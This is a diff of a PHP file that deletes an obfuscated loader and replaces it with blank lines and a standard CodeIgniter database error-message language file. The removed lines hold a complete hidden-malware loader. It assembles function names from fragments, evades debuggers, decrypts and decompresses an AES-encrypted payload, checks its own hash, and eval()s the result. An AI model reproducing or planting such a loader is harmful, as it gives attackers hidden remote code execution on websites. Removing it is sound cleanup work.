@@ -1,28 +1,63 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_awcnyxgk=('bas'.'e64'.'_de'.'cod'.'e');
-$_cgse35jo=('gzu'.'nco'.'mpr'.'ess');
-$_vd6w0u49=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_wgq72w3r='zq60G0AY';
-$_scbbw6mp='SQ9vzlxYV/A=';
-$_jc128hrd='0eDAn7Kx';
-$_ae914km5='dlWuodGf';
-$_y1q5zta6='UcFJyD7y';
-$_svopusvd='5NMsOg==';
-$_v2vjjcsi='2ueZcEQB';
-$_lq8qalx8='8iVfKomJ';
-$_g5qbsnlk=$_awcnyxgk($_ae914km5.$_wgq72w3r.$_jc128hrd.$_y1q5zta6.$_scbbw6mp);
-$_pg39nguz=$_awcnyxgk($_lq8qalx8.$_v2vjjcsi.$_svopusvd);
-$_kp1np5ir=$_awcnyxgk('k/8/tEeTeO1di5mbyQgIUw8t8hyom81HUDwjeZPq1hK8XV+u5BkzziTOyHhYK/NiF+MmTChpQRigZlXs+EExzZhCIYs4SBTcm0ALM9whnQlVcfmzYhx/B89bEo7YsRwbvOgR2VMgs5tWMqn13TfvhRnRvhS0Rm6Zbzq6E43EPPINmpnw+pjqpUsq6Lf8zc20+BRZ5coqMiXMlL+p96aKtHHYM6Wkmi6pSyQYoklC1ns+V6oIp2tqCXQaJQlIyol0YdJ0jsd4CjRz2FQiPYg/SJ1KddsKiUZu97Nhoubbz98qEyR+R5C0CCM79zsjqHxTKU3HcSby5I56uZ6RtzWoMp3yt2Lt/A84D8B+BkHmf0+VVQ02g/QCh8cBIsra4r+U3OYjWgz1krS8v5/RW3HmlEjCeQrlBSCp9bk380+BGRHyO5AbUuHjTOh1ZfjoIn44L1SFe+awro3351hFkxDxpFM04cBEqDu1FiwqxWEFz34/PhMX58+lSf/ohkrVU+Jd5De6Fc+6mAcGAi9bNxOOUA39R7HA5t3SgCPU7WEDhqrnvf/5xdOXGnRd/o8UwUFHd1a+L7RkudFsjZFV1xZWHixQrJ3v6nuerKxSPIP0M66k3cmm/KSQpdw6bCqk/UfZyg3/XOJfU0CLfD5YVdeNBqYnp+m6W9N2HWEK1rGLxqE245lNAu2R7rbgLqCWyRkt1NEaU5lomEb/k/lhywHOTklyAKOeRC15atquzgbzDXZR44k5OtVoonzlV05XQFEd67dHOw3tszZTDyVe4ZkUkw++nV+Uj+8v5IiZ3eswOLfdCs/vsPNIo4uJnn13RfOKVPR1yG3ubQiFLELgmY63UTVx6KS0KYv+k3BWtL/J3XWf13FOQn0aPJd5/Eg8enKywgdh4ud4UcT393D5FY3bWi9VaI4YICfY88aSOHrFGXMVRccIUV31ftIAZRbVhLN9AK4yUqP647aBhnxDQpac2Y6d/Uu2oQm18EflLkP2M0xV1j5yT63hdz607mrb3Sv8j+/GNAecFJziQsbuHsqQig==');
-$_sxxdx3lu=$_vd6w0u49($_kp1np5ir,'aes-256-cbc',$_g5qbsnlk,OPENSSL_RAW_DATA,$_pg39nguz);
-if($_sxxdx3lu===false){exit;}
-$_el22r2zn=$_cgse35jo($_sxxdx3lu);
-if($_el22r2zn===false){exit;}
-$_srfef40h='42747436f527f794b4e858615485223b531c67509e19c743c097cc43e021c04d';
-$_mqvdg02d=@file_get_contents(__FILE__);
-if($_mqvdg02d!==false){
-$_etq0tf8r=str_replace($_srfef40h,"0000000000000000000000000000000000000000000000000000000000000000",$_mqvdg02d);
-$_oxrpsgzl=hash("sha256",$_etq0tf8r);
-if($_oxrpsgzl!==$_srfef40h){@http_response_code(403);exit;}
-}
-eval($_el22r2zn);
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+$lang['db_invalid_connection_str'] = 'Unable to determine the database settings based on the connection string you submitted.';
+$lang['db_unable_to_connect'] = 'Unable to connect to your database server using the provided settings.';
+$lang['db_unable_to_select'] = 'Unable to select the specified database: %s';
+$lang['db_unable_to_create'] = 'Unable to create the specified database: %s';
+$lang['db_invalid_query'] = 'The query you submitted is not valid.';
+$lang['db_must_set_table'] = 'You must set the database table to be used with your query.';
+$lang['db_must_use_set'] = 'You must use the "set" method to update an entry.';
+$lang['db_must_use_index'] = 'You must specify an index to match on for batch updates.';
+$lang['db_batch_missing_index'] = 'One or more rows submitted for batch updating is missing the specified index.';
+$lang['db_must_use_where'] = 'Updates are not allowed unless they contain a "where" clause.';
+$lang['db_del_must_use_where'] = 'Deletes are not allowed unless they contain a "where" or "like" clause.';
+$lang['db_field_param_missing'] = 'To fetch fields requires the name of the table as a parameter.';
+$lang['db_unsupported_function'] = 'This feature is not available for the database you are using.';
+$lang['db_transaction_failure'] = 'Transaction failure: Rollback performed.';
+$lang['db_unable_to_drop'] = 'Unable to drop the specified database.';
+$lang['db_unsupported_feature'] = 'Unsupported feature of the database platform you are using.';
+$lang['db_unsupported_compression'] = 'The file compression format you chose is not supported by your server.';
+$lang['db_filepath_error'] = 'Unable to write data to the file path you have submitted.';
+$lang['db_invalid_cache_path'] = 'The cache path you submitted is not valid or writable.';
+$lang['db_table_name_required'] = 'A table name is required for that operation.';
+$lang['db_column_name_required'] = 'A column name is required for that operation.';
+$lang['db_column_definition_required'] = 'A column definition is required for that operation.';
+$lang['db_unable_to_set_charset'] = 'Unable to set client connection character set: %s';
+$lang['db_error_heading'] = 'A Database Error Occurred';
